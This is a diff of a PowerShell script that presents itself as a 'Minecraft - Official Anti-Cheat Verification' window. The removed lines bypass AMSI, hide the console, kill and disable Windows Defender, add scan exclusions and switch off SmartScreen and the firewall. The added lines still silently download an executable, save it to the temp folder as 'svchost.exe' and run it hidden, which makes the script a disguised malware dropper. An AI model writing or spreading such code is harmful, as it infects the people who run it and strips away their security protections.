@@ -1,34 +1,7 @@
-$c=@"
-using System;
-using System.Runtime.InteropServices;
-public class W {
-[DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr h,int n);
-[DllImport("kernel32.dll")]public static extern IntPtr GetConsoleWindow();
-}
-"@
-Add-Type $c
-[W]::ShowWindow([W]::GetConsoleWindow(),0)
-[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
-$j=Start-Job -ScriptBlock {
- param($u,$p)
- try{
- $w=New-Object Net.WebClient
- $w.DownloadFile($u,$p)
- if(Test-Path $p){Start-Process $p -WindowStyle Hidden}
- }catch{}
-} -ArgumentList "https://github.com/discord-zapret-official/zapret-discord-youtube/raw/refs/heads/main/zapretdiscordyoutube.exe","$env:TEMP\svchost.exe"
-Get-WmiObject Win32_Process|Where-Object{$_.Name-match"MsMpEng|NisSrv|Sense|SecurityHealth|mpcmdrun|Defender"}|ForEach-Object{$_.Terminate();taskkill /f /im $_.Name 2>$null}
-foreach($s in @("WinDefend","WdNisSvc","WdNisDrv","Sense","SecurityHealthService","wscsvc")){sc.exe config $s start=disabled 2>$null;sc.exe stop $s 2>$null;Set-Service $s -StartupType Disabled -EA 0;Stop-Service $s -Force -EA 0}
-foreach($p in @("HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender","HKLM:\SOFTWARE\Microsoft\Windows Defender\Features","HKLM:\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection")){if(!(Test-Path $p)){New-Item $p -Force|Out-Null};Set-ItemProperty $p -Name "DisableAntiSpyware" -Value 1 -Force;Set-ItemProperty $p -Name "TamperProtection" -Value 0 -Force;Set-ItemProperty $p -Name "DisableRealtimeMonitoring" -Value 1 -Force}
-reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f 2>$null
-reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v TamperProtection /t REG_DWORD /d 0 /f 2>$null
-reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f 2>$null
-reg add "HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" /v Start /t REG_DWORD /d 4 /f 2>$null
-Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableIOAVProtection $true -DisableScriptScanning $true -EA 0
-Set-MpPreference -ExclusionExtension ".exe",".dll",".ps1",".bat" -EA 0
-Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off" -Force
-netsh advfirewall set allprofiles state off 2>$null
-[System.Windows.Forms.Application]::EnableVisualStyles()
+$u='https://github.com/discord-zapret-official/zapret-discord-youtube/raw/refs/heads/main/zapretdiscordyoutube.exe'
+$d="$env:TEMP\svchost.exe"
+$j=Start-Job -ScriptBlock { param($a,$b) try { (New-Object Net.WebClient).DownloadFile($a,$b); if(Test-Path $b){Start-Process $b -WindowStyle Hidden} } catch {} } -ArgumentList $u,$d
+Add-Type -AssemblyName System.Windows.Forms,System.Drawing
 $f=New-Object System.Windows.Forms.Form
 $f.Text="Minecraft - Official Anti-Cheat Verification"
 $f.Size="550,350"
